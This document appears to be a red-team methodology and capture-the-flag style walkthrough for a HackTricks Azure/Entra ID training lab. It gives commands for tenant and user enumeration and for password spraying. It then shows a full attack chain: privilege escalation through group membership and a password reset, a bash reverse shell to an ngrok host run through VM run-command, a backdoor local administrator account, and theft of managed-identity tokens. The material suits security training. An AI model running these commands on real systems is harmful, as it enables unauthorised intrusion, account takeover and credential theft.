# Azure & Entra ID Blackbox Methodology

## Methodology

### Discovery and enumeration

Check if an URL belong to a tenant:

```sh
dig txt <url> # look for MS=ms...
```

Get information including tenant ID:

```sh
curl -L "login.microsoftonline.com/<url>/.well-known/openid-configuration" | jq
```

Using AADInternal:

```sh
Get-AADIntTenantID -Domain <url>
Get-AADIntTenantDomains -Domain <url>
```

Check validity of email:

```sh
Invoke-AADIntUserEnumerationAsOutsider -Username <email> [-Method <method>]
Get-Content users.txt | Invoke-AADIntUserEnumerationAsOutsider [-Method <method>]

python3 ./o365spray.py --enum -d <tenant> -u <user>
python3 ./o365spray.py --enum -d <tenant> -U users.txt

# Using valid credentials
python3 ./teamsenum -u <user> -p <password> -f users.txt
```

Once valid users found, get information about them:

```sh
Get-AADLoginInformation -Username <user>@<tenant>

curl -L "login.microsoftonline.com/GetUserRealm.srf?login=<user>@<tenant>" | jq
```

Password spray:

```sh
python3 ./o365spray.py --Spray -d <tenant> -U users.txt -p <password>
```

Or using PowerShell:

```ps1
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray --Spray -UserList users.txt -Password <password> -Verbose # Userlist containing user with domain : <user>@<tenant>
```

To look for leaked secrets:

- [Gitleaks](https://github.com/gitleaks/gitleaks)
- [Trufflehog](https://github.com/trufflesecurity/trufflehog)
- [RExpository](https://github.com/JaimePolop/RExpository) : Regex to use for searching within repositories

Also look for:

- Open buckets
- Accessible network ports
- Web (RCE/SSRF)
- Federated identities

#### Conditionnal Access Policies

Possible block based on:

- IP or geographical location
- Risk
- Device based (User agent)
- Blocked client application
- Device filter
- Authentication flow

#### Local credentials

WinPEAS/LinPEAS will find such tokens : `winpeas.exe cloud`

- Inside `<HOME>/.Azure`
- Inside `C:\Users\<username>\AppData\Local\Microsoft\IdentityCache\*` : .bin files, encrypted with user's DPAPI (access token, id tokens, account info)
- Inside `C:\Users\<username>\AppData\Local\Microsoft\TokenBroken\Cache\` : .trbe files, base64 data encrypted with user's DPAPI (access token)
- Linux/MacOS only, using `pwsh -Command "Save-AzContext -Path /tmp/az-context.json"` if used (can be check by looking if `$HOME/.local/share/.IdentityService/` exists)

## Blackbox

We begin with the following informations

```sh
Email: lab_1_blackbox_X_02fedb58-6jxrps@azure.training.hacktricks.xyz where X is a number between 1-100

Password: HackTricksTraining123!
```

Thus we start by finding which account is valid:

```sh
touch users.txt
for i in in {1..100};do printf "lab_1_blackbox_%d_3b6d0d3d-x5dma2@azure.training.hacktricks.xyz\n" "$i" >> users.txt;done

curl -L "login.microsoftonline.com/azure.training.hacktricks.xyz/.well-known/openid-configuration" | jq

python3 ./o365spray.py --enum -d fdd066e1-ee37-49bc-b08f-d0e152119b04 -U users.txt

pwsh
Install-Module -Name "AADInternals"
Import-Module -Name "AADInternals"

Get-Content users.txt | Invoke-AADIntUserEnumerationAsOutsider

az login -u lab_1_blackbox_73_3b6d0d3d-x5dma2@azure.training.hacktricks.xyz -p 'HackTricksTraining123!' --allow-no-subscriptions
```

Once logged-in:

```sh
./scan-priv-entra-2.sh # we can update group

az ad group show -g blackbox-lab-1-privileged-group-02fedb58-6jxrps
az ad signed-in-user show --query id -o tsv 2>/dev/null
az ad group member add --member-id "75f4ab45-ab73-4b57-837f-5d22f95ab833" -g blackbox-lab-1-privileged-group-3b6d0d3d-x5dma2

./scan-priv-entra-2.sh # we became Helpdesk admin
az ad user list
az ad user update --password 'HackTricksTraining123!' --id 4b3224e3-3b38-4a18-82b5-8318c5cb12ee --force-change-password-next-sign-in false

az login -u blackbox_lab_1_target_3b6d0d3d-x5dma2@azure.training.hacktricks.xyz -p 'HackTricksTraining123!'
./scan-priv-azure-2.sh

# find assigned identities (if multiples)
az vm identity show --resource-group blackbox-lab-1 --name blackbox-lab-1-vm-1-3b6d0d3d-x5dma2 --query "userAssignedIdentities | keys(@) | [0]" -o tsv

echo "bash -c 'bash -i >& /dev/tcp/4.tcp.eu.ngrok.io/10544 0>&1'" > revshell.sh
az vm run-command invoke --resource-group BLACKBOX-LAB-1 --name blackbox-lab-1-vm-1-02fedb58-6jxrps --command-id RunShellScript --scripts @revshell.sh

# from reverse shell
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
az login --identity --client-id b3a69de5-9a2c-4f6a-81cc-ddc6032d78f1

az network public-ip list

# Using management.azure.com token
az resource list
az vm extension set --resource-group blackbox-lab-1 --vm-name blackbox-lab-1-vm-2-3b6d0d3d-x5dma2 --name CustomScriptExtension --publisher Microsoft.Compute --version 1.10 --settings '{"commandToExecute": "powershell -Command \"New-LocalUser -Name hackuser -Password (ConvertTo-SecureString -AsPlainText '\''Password123!'\'' -Force); Add-LocalGroupMember -Group Administrators -Member hackuser\""}' --force-update

# From attackers VM
xfreerdp /u:"hackuser" /p:'Password123!' /v:"20.126.105.250" /drive:EXEGOL,/workspace /dynamic-resolution

# From RDP session
# As there is an hybrid worker on the VM, extract MSI endpoint using Sysinternals (https://download.sysinternals.com/files/SysinternalsSuite.zip)

# From Procexp64 as admin (search HybridWorkerService.exe -> Orchestrator.Sandbox.exe -> Properties -> Env variables)
$MSI_ENDPOINT='https://ac173285-931c-47e0-aa47-3074985a1d45.jrds.we.azure-automation.net/automationAccounts/ac173285-931c-4
7e0-aa47-3074985a1d45/sandboxes/285cfdec-bf51-4214-beba-b0733b599654/metadata/identity/oauth2/token'
$MSI_SECRET='vKKAQisy+0CfkaZfDJ94qffO/N7xPKId4FM9j/CY3N0='
$tokenAuthURI = $MSI_ENDPOINT + "?resource=https://management.azure.com/&api-version=2017-09-01"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$MSI_SECRET"} -Uri $tokenAuthURI; $tokenResponse.access_token
$tokenAuthURI = $MSI_ENDPOINT + "?resource=https://vault.azure.net/&api-version=2017-09-01"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$MSI_SECRET"} -Uri $tokenAuthURI; $tokenResponse.access_token

# Then searching for secret in Azure KV
```
